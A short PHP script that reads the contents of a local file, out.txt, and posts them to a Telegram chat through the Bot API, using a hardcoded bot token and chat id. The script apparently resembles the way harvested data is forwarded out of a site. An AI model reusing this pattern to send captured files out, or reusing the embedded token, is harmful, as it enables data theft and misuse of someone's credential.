<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1298044567:AAG96v0Rr4DMcZz9Iv9wjVMwK5BT981TEZE/sendMessage?chat_id=609859058&text=$msg");
?>
